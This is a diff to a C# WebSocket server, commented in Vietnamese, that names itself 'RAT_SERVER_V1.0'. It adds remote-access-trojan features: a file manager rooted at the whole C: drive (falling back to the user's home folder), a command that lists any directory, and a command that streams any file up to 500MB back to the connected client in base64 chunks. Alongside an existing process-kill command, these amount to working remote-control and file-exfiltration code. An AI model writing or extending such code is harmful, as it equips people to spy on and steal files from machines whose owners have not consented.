@@ -7,6 +7,8 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Linq;
 using System.Text.Json;
+using System.IO;
+using System.Collections.Generic;
 
 namespace WebSocketTest
 {
@@ -17,12 +19,35 @@ namespace WebSocketTest
         private WebSocket? _currentSocket;
         private bool _isRunning = false;
         private readonly SemaphoreSlim _sendSemaphore = new SemaphoreSlim(1, 1); // Đồng bộ SendAsync
+        private readonly FileManager _fileManager;
 
         public SimpleWebSocketServer(Action<string> loggerMethod)
         {
             _logger = loggerMethod;
+            // init FileManager rooted at the app base directory
+            try
+            {
+                // Root directory để truy cập file: C:\ (hoặc có thể config)
+                _fileManager = new FileManager(@"C:\", 
+                    maxStreamFileSizeBytes: 500L * 1024 * 1024); // 500MB limit
+            }
+            catch (Exception ex)
+            {
+                _logger?.Invoke("FileManager init error: " + ex.Message);
+                try
+                {
+                    // Fallback to user home directory
+                    string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                    _fileManager = new FileManager(homeDir);
+                }
+                catch
+                {
+                    _logger?.Invoke("Failed to initialize FileManager with fallback");
+                }
+            }
         }
 
+        // Trong hàm Start(), xử lý HTTP request song song với WebSocket
         public async void Start(string url)
         {
             _listener = new HttpListener();
@@ -30,19 +55,49 @@ namespace WebSocketTest
             _listener.Start();
             _isRunning = true;
             _logger($"Server đã khởi động tại: {url}");
-            _logger($"Để kết nối từ máy khác, dùng: ws://<IP_MÁCHNA_NÀY>:8080/");
-            _logger($"Truy cập từ máy khác: ws://<IP_CỦA_MÁY_NÀY>:8080/");
 
             try
             {
                 while (_listener.IsListening && _isRunning)
                 {
                     var context = await _listener.GetContextAsync();
-                    if (context.Request.IsWebSocketRequest) _ = ProcessClient(context);
-                    else { context.Response.StatusCode = 400; context.Response.Close(); }
+                    
+                    // ✅ XỬ LÝ HTTP HEALTH CHECK
+                    if (context.Request.Url?.AbsolutePath == "/health")
+                    {
+                        await HandleHealthCheck(context);
+                    }
+                    else if (context.Request.IsWebSocketRequest)
+                    {
+                        _ = ProcessClient(context);
+                    }
+                    else 
+                    { 
+                        context.Response.StatusCode = 400; 
+                        context.Response.Close(); 
+                    }
                 }
             }
             catch (Exception ex) { _logger("Lỗi Server: " + ex.Message); }
+        }
+
+        // ✅ ENDPOINT HEALTH CHECK
+        private async Task HandleHealthCheck(HttpListenerContext context)
+        {
+            var response = new 
+            { 
+                status = "ok", 
+                server = "RAT_SERVER_V1.0",
+                version = "1.0"
+            };
+            
+            byte[] buffer = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(response));
+            context.Response.ContentType = "application/json";
+            context.Response.ContentLength64 = buffer.Length;
+            context.Response.StatusCode = 200;
+            
+            await context.Response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
+            context.Response.Close();
         }
 
         public void Stop()
@@ -62,7 +117,15 @@ namespace WebSocketTest
             var wsContext = await context.AcceptWebSocketAsync(null);
             _currentSocket = wsContext.WebSocket;
             _logger("Client đã kết nối!");
-            await SendToClient(JsonInfo("Server Ready"));
+            // ✅ GỬI HANDSHAKE NGAY KHI KẾT NỐI
+            var handshake = new 
+            { 
+                type = "handshake", 
+                server_name = "RAT_SERVER_V1.0",
+                version = "1.0",
+                timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
+            };
+            await SendToClient(JsonSerializer.Serialize(handshake));
 
             byte[] buffer = new byte[1024 * 1024]; // 1MB buffer cho dữ liệu lớn
 
@@ -249,6 +312,85 @@ namespace WebSocketTest
                         if (int.TryParse(arg, out int pid)) return KillProcessByPid(pid);
                         return JsonError("PID phải là số");
 
+                    case "list_dir":
+                        // arg = path
+                        // Run listing asynchronously and send via websocket
+                        var listSocket = _currentSocket;
+                        _ = Task.Run(async () =>
+                        {
+                            try
+                            {
+                                var entries = await _fileManager.ListDirectoryAsync(arg);
+                                var items = entries.Select(e => new
+                                {
+                                    name = e.Name,
+                                    fullPath = e.FullPath,
+                                    isDirectory = e.IsDirectory,
+                                    size = e.Size,
+                                    lastModified = e.LastModified
+                                }).ToList();
+
+                                var payload = new { type = "file_list", path = arg, items = items };
+                                string json = JsonSerializer.Serialize(payload);
+                                if (listSocket?.State == WebSocketState.Open) await SendToClientAsync(json);
+                            }
+                            catch (Exception ex)
+                            {
+                                if (listSocket?.State == WebSocketState.Open) await SendToClientAsync(JsonError("List error: " + ex.Message));
+                            }
+                        });
+                        return JsonInfo("Listing directory...");
+
+                    case "download_file":
+                        var dlSocket = _currentSocket;
+                        _ = Task.Run(async () => {
+                            try {
+                                _logger($"[DOWNLOAD] Request for: {arg}");
+                                var meta = await _fileManager.GetFileMetadataAsync(arg);
+                                
+                                if (dlSocket?.State != WebSocketState.Open) return;
+                                
+                                var start = new { type = "file_start", path = arg, size = meta.Size, contentType = meta.ContentType };
+                                _logger($"[DOWNLOAD] Sending file_start: {JsonSerializer.Serialize(start)}");
+                                await SendToClientAsync(JsonSerializer.Serialize(start));
+                                
+                                await using var fs = await _fileManager.GetFileStreamAsync(arg);
+                                byte[] buffer = new byte[64 * 1024];
+                                int read;
+                                int index = 0;
+                                int totalChunks = 0;
+                                
+                                while ((read = await fs.ReadAsync(buffer, 0, buffer.Length)) > 0) {
+                                    if (dlSocket?.State != WebSocketState.Open) {
+                                        _logger($"[DOWNLOAD] Connection closed at chunk {index}");
+                                        break;
+                                    }
+                                    
+                                    string b64 = Convert.ToBase64String(buffer, 0, read);
+                                    var chunk = new { type = "file_chunk", index = index, path = arg, data = b64 };
+                                    _logger($"[DOWNLOAD] Sending chunk {index}: {read} bytes, base64 length: {b64.Length}");
+                                    await SendToClientAsync(JsonSerializer.Serialize(chunk));
+                                    index++;
+                                    totalChunks++;
+                                    
+                                    if (totalChunks % 10 == 0) {
+                                        _logger($"[DOWNLOAD] Sent {totalChunks} chunks for {arg}");
+                                    }
+                                }
+                                
+                                if (dlSocket?.State == WebSocketState.Open) {
+                                    var end = new { type = "file_end", path = arg, totalChunks = totalChunks };
+                                    _logger($"[DOWNLOAD] Sending file_end: {totalChunks} chunks");
+                                    await SendToClientAsync(JsonSerializer.Serialize(end));
+                                }
+                            }
+                            catch (Exception ex) {
+                                _logger($"[DOWNLOAD] Error: {ex.Message}");
+                                if (dlSocket?.State == WebSocketState.Open) 
+                                    await SendToClientAsync(JsonError($"Download error: {ex.Message}"));
+                            }
+                        });
+                        return JsonInfo("Starting download...");
                     default:
                         if (cmd == "PING") return "PONG";
                         return command;
